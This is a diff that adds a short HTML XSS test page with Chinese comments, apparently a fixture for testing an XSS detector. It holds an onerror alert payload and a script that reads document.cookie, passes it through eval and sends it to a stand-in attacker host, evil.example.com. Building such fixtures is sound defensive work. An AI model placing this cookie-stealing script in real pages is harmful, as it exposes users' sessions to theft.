@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head><meta charset="UTF-8"><title>XSS 测试页</title></head>
+<body>
+<h1>XSS 测试页</h1>
+
+<!-- XSS #2: 内联事件处理器 -->
+<img src="/not-exist.png" onerror="alert('xss via onerror')">
+
+<!-- XSS #3: 脚本块中含可疑调用 -->
+<script>
+  var cookie = document.cookie;
+  eval("console.log('leak: ' + cookie)");
+  window.open("https://evil.example.com/steal?c=" + encodeURIComponent(cookie));
+</script>
+
+<p><a href="/index.html">返回首页</a></p>
+</body>
+</html>
